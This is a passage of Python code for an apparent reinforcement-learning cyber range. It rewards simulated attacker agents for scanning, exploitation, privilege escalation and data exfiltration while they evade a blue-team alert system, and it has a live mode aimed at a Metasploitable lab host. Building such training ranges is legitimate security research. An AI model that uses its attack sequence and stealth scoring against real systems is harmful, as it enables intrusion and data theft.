        if "-A" in command or "-O" in command:
            quality += 0.2
        if "-T4" in command or "-T5" in command:
            quality += 0.1
            self._increase_detection(0.3)
        
        return min(0.9, quality)

    def _generate_service_banner(self, service: str, port: int) -> str:
        """Generate a realistic service banner for a service type"""
        banners = {
            "ftp": [f"220 ProFTPD 1.3.3c Server (FTP service) [{self.target_ip}]", 
                    f"220 (vsFTPd 2.3.4) [{self.target_ip}]"],
            "ssh": [f"SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 [{self.target_ip}]",
                    f"SSH-2.0-OpenSSH_7.9p1 Ubuntu-10 [{self.target_ip}]"],
            "http": [f"Apache/2.4.18 (Ubuntu) [{self.target_ip}]",
                     f"nginx/1.14.0 (Ubuntu) [{self.target_ip}]"],
            "https": [f"Apache/2.4.18 (Ubuntu) [{self.target_ip}]",
                      f"nginx/1.14.0 (Ubuntu) [{self.target_ip}]"],
            "smb": [f"Samba smbd 3.X - 4.X [{self.target_ip}]",
                    f"Windows SMB service [{self.target_ip}]"],
            "mysql": [f"MySQL 5.5.62-0ubuntu0.14.04.1 [{self.target_ip}]",
                      f"MySQL 8.0.20 [{self.target_ip}]"],
            "postgres": [f"PostgreSQL 9.5.21 on x86_64-pc-linux-gnu [{self.target_ip}]",
                         f"PostgreSQL 12.3 on x86_64-pc-linux-gnu [{self.target_ip}]"],
            "rdp": [f"Microsoft Terminal Services [{self.target_ip}]"],
            "smtp": [f"Postfix smtpd [{self.target_ip}]",
                     f"ESMTP Sendmail 8.14.4/8.14.4 [{self.target_ip}]"],
            "telnet": [f"Ubuntu 14.04 telnetd [{self.target_ip}]"],
            "dns": [f"BIND 9.10.3-P4 [{self.target_ip}]"],
            "ldap": [f"OpenLDAP 2.2.26 [{self.target_ip}]"]
        }
        
        if self.live_mode and self.target_ip == "192.168.1.119":
            metasploitable_banners = {
                21: "220 (vsFTPd 2.3.4)",
                22: "SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1",
                23: "Ubuntu 8.04 LTS telnetd",
                25: "220 metasploitable.localdomain ESMTP Postfix",
                53: "BIND 9.4.2",
                80: "Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10",
                139: "Samba smbd 3.X - 4.X",
                445: "Samba smbd 3.X - 4.X",
                3306: "MySQL 5.0.51a-3ubuntu5",
                8180: "Apache Tomcat/5.5.29"
            }
            if port in metasploitable_banners:
                return metasploitable_banners[port]
        
        if service in banners:
            return random.choice(banners[service])
        else:
            return f"Unknown service on port {port} [{self.target_ip}]"

    def _process_enum_command(self, command: str) -> Tuple[float, Dict[str, Any]]:
        """
        Process enumeration commands like gobuster, enum4linux, etc.
        Updates discovered vulnerabilities and returns reward.
        """
        info = {"command_type": "enum", "success": False, "new_discoveries": []}
        reward = 0.0
        
        if not self.service_banners:
            info["message"] = "No services discovered to enumerate. Run port scans first."
            reward = -1.0
            return reward, info
        
        recent_enums = [a for a in self.previous_actions[-5:] if "enum" in self._detect_command_type(a)]
        redundant = len(recent_enums) >= 3
        
        if redundant:
            info["message"] = "Redundant enumeration detected. Try a different approach."
            self._increase_detection(0.2)
            reward = -1.0
            return reward, info
        
        if "gobuster" in command or "dirb" in command or "dirbuster" in command:
            web_ports = [port for port, banner in self.service_banners.items() 
                         if "http" in banner.lower() or port in [80, 443, 8080, 8443]]
            
            if not web_ports:
                info["message"] = "No web services detected to enumerate"
                reward = -0.5
            else:
                potential_dirs = [
                    "/admin", "/login", "/wp-admin", "/phpmyadmin", "/config", 
                    "/backup", "/api", "/upload", "/test", "/dev"
                ]
                
                quality = 0.3
                if "-w" in command:
                    if "common.txt" in command:
                        quality += 0.2
                    elif "big.txt" in command or "directory-list" in command:
                        quality += 0.4
                    else:
                        quality += 0.1
                
                if "-x" in command:
                    quality += 0.2
                
                undiscovered_dirs = [d for d in potential_dirs if f"webdir_{d}" not in self.discovered_info]
                num_to_discover = max(1, int(len(undiscovered_dirs) * quality))
                
                if undiscovered_dirs:
                    discovered_dirs = random.sample(undiscovered_dirs, min(num_to_discover, len(undiscovered_dirs)))
                    
                    for dir in discovered_dirs:
                        self.discovered_info.add(f"webdir_{dir}")
                        
                        if dir in ["/admin", "/phpmyadmin", "/config", "/backup"]:
                            vuln_id = f"vuln_webpath_{dir}"
                            if vuln_id not in self.discovered_vulnerabilities:
                                self.discovered_vulnerabilities.append(vuln_id)
                                info["new_discoveries"].append(f"Vulnerable web path: {dir}")
                    
                    reward = len(discovered_dirs) * 3.0
                    info["success"] = True
                    info["message"] = f"Discovered {len(discovered_dirs)} web paths"
                    
                    self.phase_progress["enumeration"] += len(discovered_dirs)
                    
                else:
                    info["message"] = "Web enumeration complete, no new paths found"
                    reward = -0.5
                    
                self._increase_detection(0.3)
        
        elif "enum4linux" in command or "smbclient" in command:
            smb_ports = [port for port, banner in self.service_banners.items() 
                         if "smb" in banner.lower() or "samba" in banner.lower() or port in [139, 445]]
            
            if not smb_ports:
                info["message"] = "No SMB services detected to enumerate"
                reward = -0.5
            else:
                potential_findings = [
                    "smb_shares", "smb_users", "smb_weak_security", "smb_guest_access"
                ]
                
                undiscovered = [f for f in potential_findings if f not in self.discovered_info]
                
                quality = 0.4
                if "-a" in command:
                    quality += 0.3
                    
                num_to_discover = max(1, int(len(undiscovered) * quality))
                
                if undiscovered:
                    discoveries = random.sample(undiscovered, min(num_to_discover, len(undiscovered)))
                    
                    for discovery in discoveries:
                        self.discovered_info.add(discovery)
                        
                        if discovery in ["smb_weak_security", "smb_guest_access"]:
                            vuln_id = f"vuln_{discovery}"
                            if vuln_id not in self.discovered_vulnerabilities:
                                self.discovered_vulnerabilities.append(vuln_id)
                                info["new_discoveries"].append(f"SMB vulnerability: {discovery}")
                    
                    reward = len(discoveries) * 3.5
                    info["success"] = True
                    info["message"] = f"Discovered {len(discoveries)} SMB findings"
                    
                    self.phase_progress["enumeration"] += len(discoveries)
                    
                else:
                    info["message"] = "SMB enumeration complete, no new findings"
                    reward = -0.5
                    
                self._increase_detection(0.3)
        
        else:
            success_chance = min(0.7, len(self.service_banners) / 10.0)
            
            if random.random() < success_chance:
                service_types = list(set([banner.split()[0].lower() for banner in self.service_banners.values()]))
                
                if service_types:
                    service = random.choice(service_types)
                    
                    vuln_id = f"vuln_{service}_{random.randint(1000, 9999)}"
                    
                    if vuln_id not in self.discovered_vulnerabilities:
                        self.discovered_vulnerabilities.append(vuln_id)
                        info["new_discoveries"].append(f"Potential vulnerability in {service}")
                        
                        reward = 4.0
                        info["success"] = True
                        info["message"] = f"Discovered potential vulnerability in {service}"
                        
                        self.phase_progress["enumeration"] += 1
                    else:
                        info["message"] = "Enumeration found known vulnerability"
                        reward = 1.0
            else:
                info["message"] = "Enumeration completed but found nothing of interest"
                reward = 0.0
                
            self._increase_detection(0.25)
            
        return reward, info
        
    def _process_exploit_command(self, command: str) -> Tuple[float, Dict[str, Any]]:
        """
        Process exploit commands like metasploit, sqlmap, etc.
        Updates exploited vulnerabilities and returns reward.
        """
        info = {"command_type": "exploit", "success": False}
        reward = 0.0
        
        if not self.discovered_vulnerabilities:
            info["message"] = "No vulnerabilities discovered to exploit. Run enumeration first."
            reward = -2.0
            self._increase_detection(0.5)
            return reward, info
            
        # PHASE 3: Allow exploits if services enumerated, even from enumeration phase
        # This enables agents to exploit as soon as they find vulnerabilities
        if self.current_phase not in ["exploit", "privesc", "exfiltrate", "enumeration"]:
            info["message"] = "Premature exploitation attempt. Discover services first."
            reward = -1.0
            self._increase_detection(0.4)
            return reward, info
            
        exploit_success = False
        success_chance = 0.0
        
        if "metasploit" in command or "msfconsole" in command:
            vuln_count = len(self.discovered_vulnerabilities)
            # PHASE 3: Boosted base from 0.3→0.5 for sim training reliability
            success_chance = min(0.85, 0.5 + (vuln_count * 0.1))
            
            exploit_match = re.search(r'(exploit/\S+)', command)
            if exploit_match:
                specific_exploit = exploit_match.group(1)
                
                service_match = False
                for service in self.services:
                    if service in specific_exploit:
                        service_match = True
                        break
                        
                if service_match:
                    success_chance += 0.2
            
            self._increase_detection(0.7)
            
        elif "sqlmap" in command:
            web_found = False
            for port, banner in self.service_banners.items():
                if "http" in banner.lower() or port in [80, 443, 8080, 8443]:
                    web_found = True
                    break
                    
            if web_found:
                # PHASE 3: Boosted from 0.6→0.7 for sim training
                success_chance = 0.7
                
                if "--level" in command or "--risk" in command:
                    success_chance += 0.1
                if "-p" in command:
                    success_chance += 0.1
                    
                self._increase_detection(0.6)
            else:
                info["message"] = "SQLMap failed: no web services discovered"
                reward = -1.0
                self._increase_detection(0.3)
                return reward, info
                
        elif "hydra" in command or "brute" in command or "crack" in command:
            target_valid = False
            
            for service in self.services:
                if service in command.lower():
                    target_valid = True
                    break
                    
            if target_valid:
                # PHASE 3: Boosted from 0.5→0.65 for sim training
                success_chance = 0.65
                
                if "-P" in command or "wordlist" in command:
                    success_chance += 0.2
                    
                self._increase_detection(0.9)
            else:
                info["message"] = "Brute force failed: invalid or undiscovered target"
                reward = -1.0
                self._increase_detection(0.4)
                return reward, info
                
        else:
            # PHASE 3: Boosted from 0.1/vuln → 0.15/vuln, cap 0.6
            success_chance = min(0.6, len(self.discovered_vulnerabilities) * 0.15 + 0.1)
            
            self._increase_detection(0.5)
            
        if random.random() < success_chance:
            exploit_success = True
            
            exploit_id = f"exploit_{len(self.exploited_vulnerabilities) + 1}"
            
            if exploit_id not in self.exploited_vulnerabilities:
                self.exploited_vulnerabilities.append(exploit_id)
                
                self.credentials_found = True
                
                if self.privilege_level == "none":
                    self.privilege_level = "user"
                    
                reward = 14.0
                info["success"] = True
                info["message"] = "Exploit successful! User access gained."
                
                self.phase_progress["exploit"] += 1
                
                self._increase_alert(5.0)
            else:
                info["message"] = "Exploit worked but yielded same access as before"
                reward = 5.0
                
        else:
            info["message"] = "Exploit attempt failed"
            reward = -2.0
            
            self._increase_detection(0.4)
            self._increase_alert(2.0)
            
        return reward, info

    def _process_privesc_command(self, command: str) -> Tuple[float, Dict[str, Any]]:
        """
        Process privilege escalation commands.
        Updates privilege level and returns reward.
        """
        info = {"command_type": "privesc", "success": False}
        reward = 0.0
        
        if self.privilege_level == "none":
            info["message"] = "Cannot escalate privileges without first gaining access. Run exploits first."
            reward = -2.0
            return reward, info
            
        if self.privilege_level == "root":
            info["message"] = "Already have root privileges"
            reward = -1.0
            return reward, info
            
        if "sudo" in command or "su" in command:
            if self.credentials_found:
                # PHASE 3: Boosted from 0.7→0.8 for sim training
                success_chance = 0.8
                
                if random.random() < success_chance:
                    self.privilege_level = "root"
                    info["success"] = True
                    info["message"] = "Privilege escalation successful! Root access gained."
                    reward = 28.0
                    
                    self.phase_progress["privesc"] += 1
                    
                    self._increase_alert(7.0)
                else:
                    info["message"] = "Privilege escalation failed: incorrect password or insufficient permissions"
                    reward = -2.0
                    
                    self._increase_alert(3.0)
            else:
                info["message"] = "Privilege escalation failed: no valid credentials found"
                reward = -2.0
                
        elif "linpeas" in command or "winpeas" in command or "pe-svc" in command:
            success_chance = 0.8
            
            if random.random() < success_chance:
                vectors = [
                    "SUID binary", "cron job", "sudo misconfiguration", 
                    "kernel exploit", "weak file permissions"
                ]
                vector = random.choice(vectors)
                
                vector_id = f"privesc_{vector.replace(' ', '_')}"
                self.discovered_info.add(vector_id)
                
                info["success"] = True
                info["message"] = f"Found potential privilege escalation vector: {vector}"
                reward = 8.0
                
                self.phase_progress["privesc"] = int(self.phase_progress["privesc"] + 0.5)
                
                self._increase_detection(0.3)
            else:
                info["message"] = "Privilege escalation scan found no vectors"
                reward = -1.0
                
        else:
            has_vector = any(item.startswith("privesc_") for item in self.discovered_info)
            
            if has_vector:
                # PHASE 3: Boosted from 0.6→0.7 with vectors
                success_chance = 0.7
                
                if random.random() < success_chance:
                    self.privilege_level = "root"
                    info["success"] = True
                    info["message"] = "Privilege escalation successful! Root access gained."
                    reward = 28.0
                    
                    self.phase_progress["privesc"] += 1
                    
                    self._increase_alert(7.0)
                else:
                    info["message"] = "Privilege escalation attempt failed"
                    reward = -2.0
                    
                    self._increase_alert(3.0)
            else:
                success_chance = 0.2
                
                if random.random() < success_chance:
                    self.privilege_level = "root"
                    info["success"] = True
                    info["message"] = "Privilege escalation successful through blind attempt! Root access gained."
                    reward = 35.0
                    
                    self.phase_progress["privesc"] += 1
                    
                    self._increase_alert(8.0)
                else:
                    info["message"] = "Blind privilege escalation failed. Try finding vectors first."
                    reward = -3.0
                    
                    self._increase_alert(4.0)
            
        return reward, info

    def _process_exfil_command(self, command: str) -> Tuple[float, Dict[str, Any]]:
        """
        Process data exfiltration commands.
        Updates data_exfiltrated status and returns reward.
        """
        info = {"command_type": "exfil", "success": False}
        reward = 0.0
        
        if self.privilege_level == "none":
            info["message"] = "Cannot exfiltrate data without first gaining access"
            reward = -2.0
            return reward, info
            
        is_root = self.privilege_level == "root"
        
        if "zip" in command or "tar" in command:
            success_chance = 0.7 if is_root else 0.4
            
            if random.random() < success_chance:
                self.discovered_info.add("data_archive_created")
                
                info["success"] = True
                info["message"] = "Successfully archived target data"
                reward = 10.0
                
                self.phase_progress["exfiltrate"] = int(self.phase_progress["exfiltrate"] + 0.5)
                
                self._increase_detection(0.4)
                self._increase_alert(2.0)
            else:
                info["message"] = "Failed to archive data: permission denied"
                reward = -2.0
                
        elif "scp" in command or "download" in command or "transfer" in command or "copy" in command:
            has_archive = "data_archive_created" in self.discovered_info
            
            if has_archive:
                success_chance = 0.8
            else:
                success_chance = 0.4
                
            if random.random() < success_chance:
                self.data_exfiltrated = True
                info["success"] = True
                info["message"] = "Data successfully exfiltrated!"
                reward = 65.0
                
                self.done = True
                
                self.phase_progress["exfiltrate"] += 1
                
                self._increase_detection(0.8)
                self._increase_alert(8.0)
            else:
                info["message"] = "Data transfer failed"
                reward = -3.0
                
                self._increase_detection(0.5)
                self._increase_alert(3.0)
                
        else:
            success_chance = 0.5 if is_root else 0.2
            
            if random.random() < success_chance:
                self.data_exfiltrated = True
                info["success"] = True
                info["message"] = "Data successfully exfiltrated through direct method!"
                reward = 65.0
                
                self.done = True
                
                self.phase_progress["exfiltrate"] += 1
                
                self._increase_detection(0.9)
                self._increase_alert(9.0)
            else:
                info["message"] = "Exfiltration attempt failed"
                reward = -3.0
                
                self._increase_detection(0.6)
                self._increase_alert(4.0)
                
        return reward, info

    def _process_blue_defense(self, defense_result):
        if defense_result.get("honeypots_deployed"):
            self.honeypots += defense_result["honeypots"]
            self.services += defense_result["honeypots"]
            console.print("[yellow]🛡️ BlueAgent deployed honeypots![/yellow]")

        if defense_result.get("credentials_reset"):
            self.credentials_found = False
            self.privilege_level = "none"
            console.print("[yellow]🔐 BlueAgent reset credentials![/yellow]")

        self.blue_team_alert += defense_result.get("alert_increase", 0.0)
        self.detection_risk += defense_result.get("risk_increase", 0.0)
        self.blue_team_alert = min(self.blue_team_alert, 100.0)
        self.detection_risk = min(self.detection_risk, 10.0)

        if self.blue_team_alert >= self.traceback_threshold:
            console.print(
                "[red]🚨 TRACEBACK: BlueAgent has compromised RedAgent![/red]"
            )
            self.done = True

    def _check_phase_transition(self):
        """Check if phase transition criteria are met.
        
        Phase 6.4: DISCOVERY-GATED transitions for live MS2 training.
        Agents must demonstrate REAL progress (actual discoveries) to
        advance, not just run N commands of the right category.
        
        Gates:
            RECON → ENUMERATION:   ≥3 ports discovered
            ENUMERATION → EXPLOIT: ≥2 services identified OR credentials known
            EXPLOIT → PRIVESC:     shell obtained
            PRIVESC → EXFILTRATE:  root shell OR admin access
            EXFILTRATE → DONE:     data exfiltrated
        """
        current = self.current_phase
        
        if current == "exfiltrate" and self.data_exfiltrated:
            # Phase 6.6: Don't end — transition to CLOSEOUT
            if "closeout" in self.phases:
                self.current_phase = "closeout"
                console.print("[green]✓ Phase transition: exfiltrate → closeout[/green]")
                return
            else:
                self.done = True
                return
        
        if current not in self.phase_transitions:
            return
        
        next_phase = self.phase_transitions[current]["next"]
        counter_threshold = self.phase_transitions[current]["threshold"]
        counter_met = self.phase_progress[current] >= counter_threshold
        
        # ── Phase 6.4: Discovery gates (require REAL evidence) ──────
        # Counter must ALSO be met (backward compat). Discovery gate
        # is the binding constraint — prevents trivial phase advancement.
        discovery_gate_met = False
        
        if current == "recon":
            # Need at least 3 real ports discovered
            n_ports = len(self.open_ports) if self.open_ports else 0
            discovery_gate_met = n_ports >= 3
        elif current == "enumeration":
            # Need services identified OR credentials
            n_services = len(self.services) if self.services else 0
            has_creds = self.credentials_found
            discovery_gate_met = n_services >= 2 or has_creds
        elif current == "exploit":
            # Need shell access
            has_shell = len(self.active_shells) > 0 or self.privilege_level not in ("none", "")
            discovery_gate_met = has_shell
        elif current == "privesc":
            # Need root/admin
            is_root = self.privilege_level in ("root", "admin", "SYSTEM")
            discovery_gate_met = is_root
        elif current == "exfiltrate":
            # Need actual exfiltration
            discovery_gate_met = self.data_exfiltrated
        elif current == "closeout":
            # Phase 6.6: Need artifacts removed / target verified
            closeout_progress = self.phase_progress.get("closeout", 0)
            discovery_gate_met = closeout_progress >= 2
        else:
            # Unknown phase — fall back to counter only
            discovery_gate_met = True
        
        if counter_met and discovery_gate_met:
            if next_phase == "complete":
                self.done = True
            else:
                self.current_phase = next_phase
                console.print(f"[green]✓ Phase transition: {current} → {next_phase}[/green]")
                
                self.state = self.get_global_state()
                
                self._visualize_state_change("Phase transition", {
                    "previous_phase": current,
                    "new_phase": next_phase
                })

    # ─────────────────────────────────────────────
    # 👁️ Orion Strategic Oversight
    # ─────────────────────────────────────────────
    def _orion_overwatch(self):
        if self.agent_manager is not None and hasattr(self.agent_manager, 'orion_agent') and self.agent_manager.orion_agent is not None:
            insight = self.agent_manager.orion_agent.evaluate_environment(
                self.get_global_state()
            )
            if insight:
                console.print(f"[blue]👁️ Orion Insight:[/blue] {insight}")
                self._adjust_strategy(insight)
        else:
            # Skip orion overwatch if not available
            pass

    def _adjust_strategy(self, insight):
        if "increase stealth" in insight.lower():
            self.traceback_threshold += 5
            console.print(
                "[cyan]🔧 Environment adjusted for higher stealth tolerance.[/cyan]"
            )
        elif "prepare counter" in insight.lower():
            self.blue_team_alert += 5
            console.print("[magenta]⚠️ Blue Team readiness increased.[/magenta]")

    # ─────────────────────────────────────────────
    # ⚡ Risk & Alert Adjustments
    # ─────────────────────────────────────────────
    def _adjust_risks(self, phase):
        risk_map = {
            "recon": 0.2,
            "enumeration": 0.4,
            "exploit": 0.7,
            "privesc": 0.9,
            "exfiltrate": 1.0,
        }
        alert_map = {
            "recon": 1.0,
            "enumeration": 3.0,
            "exploit": 5.0,
            "privesc": 7.0,
            "exfiltrate": 10.0,
        }

        self._increase_detection(risk_map.get(phase, 0.5))
        self._increase_alert(alert_map.get(phase, 2.0))

    def _increase_detection(self, amount):
        scale = 1 + (self.difficulty_level / self.max_difficulty)
        self.detection_risk = min(self.detection_risk + amount * scale, 10.0)
        self.stealth_metric = max(0.0, self.stealth_metric - (amount * 0.5))

    def _increase_alert(self, amount):
        aggressiveness = self.dynamic_profile.get("blue_aggressiveness", 2) / 3 if self.dynamic_profile else 2/3
        self.blue_team_alert = min(
            self.blue_team_alert + amount * aggressiveness, 100.0
        )

    # ─────────────────────────────────────────────
    # 🔍 Advanced Stealth and Detection System
    # ─────────────────────────────────────────────
    def _update_blue_team_alertness(self, action_impact):
        """
        Update the blue team alertness level based on the impact of an action.
        
        PHASE 0 FIX: Normalized to 0-100 scale (was incorrectly using 0-10).
        
        Args:
            action_impact (float): The stealth impact of the action (higher = more noisy)
        """
        # Calculate the new alertness level
        # Scale the impact by the current difficulty
        # Multiply by 10 to convert from old 0-10 scale to 0-100 scale
        scaled_impact = action_impact * (self.difficulty_level / 5.0) * 10.0
        
        # Apply a damping factor based on agent skill level
        if hasattr(self, "agent_stealth_skill"):
            damping = max(0.2, 1.0 - (self.agent_stealth_skill / 10.0))
            scaled_impact *= damping
        
        # Update the alertness level with some randomness
        # Cap at 100 (not 10) - PHASE 0 FIX
        random_factor = random.uniform(0.8, 1.2)
        self.blue_team_alert = min(100.0, self.blue_team_alert + (scaled_impact * random_factor))
        
        # Log the change for monitoring (now shows /100.0)
        if self.verbose:
            print(f"[Blue Team] Alertness increased to {self.blue_team_alert:.2f}/100.0 (action impact: {action_impact})")
            
        # Check if we've triggered a security incident
        # Threshold is 80 on 0-100 scale (was 8 on 0-10 scale) - PHASE 0 FIX
        if self.blue_team_alert >= 80.0:
            self._trigger_blue_team_response()
            
    def _decay_blue_team_alertness(self):
        """Decay the blue team alertness level over time.
        
        PHASE 0 FIX: Normalized to 0-100 scale.
        """
        # Blue team alertness decays slower at higher difficulty levels
        # Multiply decay rate by 10 for 0-100 scale
        decay_rate = 2.0 * (1.0 - (self.difficulty_level / 10.0))
        self.blue_team_alert = max(0.0, self.blue_team_alert - decay_rate)  # Allow decay to 0
        
        if self.verbose and self.steps_taken % 5 == 0:
            print(f"[Blue Team] Alertness decayed to {self.blue_team_alert:.2f}/100.0")
            
    def _trigger_blue_team_response(self):
        """Trigger a blue team response when alertness reaches a critical level."""
        # Log the incident
        print(f"[ALERT] 🚨 Blue team has detected suspicious activity! Incident response initiated.")
        
        # Determine response based on the environment mode
        if self.mode == "simulated":
            # In simulated mode, apply penalties but don't terminate
            self.incident_count = getattr(self, "incident_count", 0) + 1
            
            # Apply countermeasures based on incident count
            if self.incident_count == 1:
                print("[Blue Team] 🛡️ Increased monitoring deployed")
                self.detection_risk = min(self.detection_risk * 1.5, 10.0)
            elif self.incident_count == 2:
                print("[Blue Team] 🛡️ Active defense measures deployed")
                # Remove some random compromised hosts
                if self.compromised_hosts:
                    host_to_clear = random.choice(list(self.compromised_hosts))
                    self.compromised_hosts.remove(host_to_clear)
                    print(f"[Blue Team] 🔒 Lost access to {host_to_clear}")
            else:
                print("[Blue Team] 🛡️ Full lockdown initiated - mission failure")
                self.terminated = True
                
            # Apply penalty via increased detection risk (score attribute doesn't exist)
            self.detection_risk = min(self.detection_risk + 2.0, 10.0)
        else:
            # In live mode, just log and be more careful
            print("[Warning] High detection rate in live environment - reducing activity temporarily")
            self.cooldown_period = 5  # Set a cooldown period
            
    def get_basic_stealth_report(self):
        """
        Get a detailed report on the current stealth status.
        
        PHASE 0 FIX: Updated to use 0-100 scale for blue_team_alert.
        
        Returns:
            dict: Report containing stealth metrics
        """
        # Stealth score is inverse of alert (0-100 scale)
        stealth_score = 100 - self.blue_team_alert
        
        # Calculate detection risk for the next action based on current alertness
        detection_risk = {
            "low_impact_action": self.blue_team_alert * 0.01,  # Scaled for 0-100
            "medium_impact_action": self.blue_team_alert * 0.02,
            "high_impact_action": self.blue_team_alert * 0.03
        }
        
        # Classify the current stealth status (thresholds scaled for 0-100)
        if stealth_score >= 80:
            status = "Excellent - Ghost mode"
        elif stealth_score >= 60:
            status = "Good - Low profile"
        elif stealth_score >= 40:
            status = "Moderate - Some traces detected"
        elif stealth_score >= 20:
            status = "Poor - Significant traces detected"
        else:
            status = "Critical - Nearly compromised"
            
        # Formulate recommendations based on current status
        if stealth_score < 50:
            recommendations = [
                "Consider a cooldown period to let alertness decay",
                "Use more stealthy techniques for your next actions",
                "Focus on low-impact reconnaissance"
            ]
        else:
            recommendations = [
                "Continue with current approach",
                "Maintain tempo while monitoring alertness"
            ]
            
        return {
            "stealth_score": stealth_score,
            "blue_team_alertness": self.blue_team_alert,
            "status": status,
            "detection_risk": detection_risk,
            "incident_count": getattr(self, "incident_count", 0),
            "recommendations": recommendations
        }
    
    # ─────────────────────────────────────────────
    # 🎚️ Dynamic Difficulty Adjustment
    # ─────────────────────────────────────────────
    def adjust_difficulty(self, guidance=None):
        """
        Dynamically adjust the difficulty of the environment.
        
        Args:
            guidance (dict, optional): Guidance from OrionAgent on difficulty adjustment
        """
        # If guidance is provided by OrionAgent, use it
        if guidance and isinstance(guidance, dict):
            if "difficulty_delta" in guidance:
                self.difficulty_level = max(1, min(10, self.difficulty_level + guidance["difficulty_delta"]))
                
            if "focus_areas" in guidance:
                self.focus_areas = guidance["focus_areas"]
                
            if "detected_skill_level" in guidance:
                self.agent_skill_level = guidance["detected_skill_level"]
                
            return {
                "status": "adjusted",
                "new_difficulty": self.difficulty_level,
                "focus_areas": getattr(self, "focus_areas", [])
            }
            
        # Without guidance, use internal metrics to adjust difficulty
        success_rate = 0
        if hasattr(self, "action_history") and self.action_history:
            success_count = sum(1 for action in self.action_history[-20:] if action.get("success", False))
            success_rate = success_count / min(20, len(self.action_history))
            
        # If success rate is very high, increase difficulty
        if success_rate > 0.8:
            self.difficulty_level = min(10, self.difficulty_level + 0.5)
        # If success rate is very low, decrease difficulty
        elif success_rate < 0.3:
            self.difficulty_level = max(1, self.difficulty_level - 0.5)
            
        return {
            "status": "auto-adjusted",
            "new_difficulty": self.difficulty_level,
            "success_rate": success_rate
        }
        
    def apply_difficulty_effects(self):
        """Apply effects of the current difficulty level to the environment."""
        # Adjust detection rates based on difficulty
        self.detection_rate = 0.05 + (0.03 * self.difficulty_level)
        
        # Adjust vulnerability density
        self.vulnerability_density = 1.0 - (0.05 * self.difficulty_level)
        
        # Adjust blue team responsiveness
        self.blue_team_response_time = 10 - self.difficulty_level
        
        # Update the environment parameters
        if self.verbose:
            print(f"[Difficulty] Level set to {self.difficulty_level:.1f}/10.0")
            print(f"[Difficulty] Detection rate: {self.detection_rate:.2f}")
            print(f"[Difficulty] Vulnerability density: {self.vulnerability_density:.2f}")
            
    def get_focus_areas(self):
        """
        Get the current focus areas for training as determined by OrionAgent.
        
        Returns:
            list: List of focus areas to emphasize in training
        """
        return getattr(self, "focus_areas", [])

    # ─────────────────────────────────────────────
    # 🧠 GPT-Powered Output Generation
    # ─────────────────────────────────────────────
    def generate_output(self, command):
        """Generate realistic command output based on environment state and command"""
        try:
            if not command or not isinstance(command, str):
                return "Command not recognized."
                
            if self.detection_risk > 9.5:
                return "⚠ ALERT: IDS detected malicious behavior. Connection terminated."

            cmd_parts = command.split()
            base_cmd = cmd_parts[0].lower() if cmd_parts else ""
            
            if base_cmd == "nmap":
                ports = ", ".join([f"{port}/tcp open" for port in self.open_ports[:5]])
                services = ", ".join([f"{port}: {svc}" for port, svc in 
                                    zip(self.open_ports[:5], random.sample(self.services, min(5, len(self.services))))])
                return f"Starting Nmap scan...\n\nPORT     STATE SERVICE\n{ports}\n\nService Info:\n{services}\n\nScan completed in 5.2s"
                
            elif base_cmd == "gobuster":
                if "dir" in cmd_parts and any(s for s in self.services if "http" in s):
                    paths = ["/admin", "/login", "/images", "/css", "/js", "/api", "/backup"]
                    found = random.sample(paths, random.randint(2, 5))
                    return "Starting gobuster scan...\n\n" + "\n".join([f"/{p} (Status: 200)" for p in found])
                return "No web server detected on target."
                
            elif base_cmd == "hydra":
                if random.random() < 0.3 and self.current_phase == "exploit":
                    self.credentials_found = True
                    return "[SUCCESS] login: admin password: Password123!"
                return "16 of 100 tasks completed, 0 valid passwords found"
                
            elif base_cmd in ["sudo", "su"] and self.current_phase == "privesc":
                if random.random() < 0.4 and self.privilege_level == "user":
                    self.privilege_level = "root"
                    return "# Root privileges obtained"
                return "Password incorrect"
                
            elif base_cmd in ["tar", "zip", "scp"] and self.current_phase == "exfiltrate":
                if self.privilege_level == "root" and random.random() < 0.7:
                    self.data_exfiltrated = True
                    return "Data successfully archived/transferred"
                return "Permission denied or transfer failed"
                
            try:
                gpt_prompt = f"""You are a cyber range simulation AI.
Generate a realistic output for the command: {command}
Current phase: {self.current_phase}
Services: {', '.join(self.services)}
Privilege: {self.privilege_level}
Keep it brief (max 5 lines) and realistic."""

                result = subprocess.run(
                    ["sgpt", "--model", "gpt-5.1-codex-mini", "--temperature", "0.4", "--role", "aria", gpt_prompt],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=8
                )
                output = result.stdout.strip()
                if output:
                    return output
            except Exception:
                pass
                
            return f"Command '{base_cmd}' executed successfully."
        except Exception as e:
            console.print(f"[red]❌ Error generating output: {e}[/red]")
            return f"Error generating output for command: {command}"

    def get_command_output(self, command):
        """Process command and return appropriate output"""
        return self.generate_output(command)

    def _visualize_state_change(self, title, changes):
        """Visualize state changes in the environment"""
        from rich.panel import Panel
        from rich.table import Table
        
        table = Table(title=title, show_header=False)
        table.add_column("Property")
        table.add_column("Value")
        
        for key, value in changes.items():
            table.add_row(key, str(value))
        
        console.print(Panel(table, border_style="blue"))
        
    def _visualize_action_result(self, agent, action, result):
        """Visualize the result of an agent's action"""
        from rich.panel import Panel
        from rich.table import Table
        
        color = "red" if agent == "RedAgent" else "blue"
        
        table = Table(title=f"{agent} Action Result", show_header=False)
        table.add_column("Property", style=color)
        table.add_column("Value")
        
        if isinstance(action, int):
            action = f"Action ID: {action}"
            
        table.add_row("Action", str(action))
        table.add_row("Phase", result.get("phase", "N/A"))
        
        reward = result.get("reward", 0)
        if reward > 20:
            reward_str = f"[bold green]{reward:.2f}[/bold green]"
        elif reward > 0:
            reward_str = f"[green]{reward:.2f}[/green]"
        elif reward < -10:
            reward_str = f"[bold red]{reward:.2f}[/bold red]"
        else:
            reward_str = f"[red]{reward:.2f}[/red]"
        table.add_row("Reward", reward_str)
        
        table.add_row("Alert Level", f"{result.get('alert', 0):.2f}")
        risk_val = result.get('risk', 0)
        try:
            risk_val = float(risk_val)
        except Exception:
            risk_val = 0.0
        table.add_row("Risk", f"{risk_val:.2f}")
        
        console.print(Panel(table, border_style=color))
        
    def _visualize_defense_result(self, defense):
        """Visualize defensive measures taken by BlueAgent"""
        from rich.panel import Panel
        from rich.table import Table
        
        if not defense:
            console.print("[blue]No defensive measures taken[/blue]")
            return
            
        table = Table(title="🛡️ Defensive Measures", show_header=False)
        table.add_column("Measure", style="blue")
        table.add_column("Value")
        
        for key, value in defense.items():
            if key in ["honeypots", "honeypots_deployed"] and value:
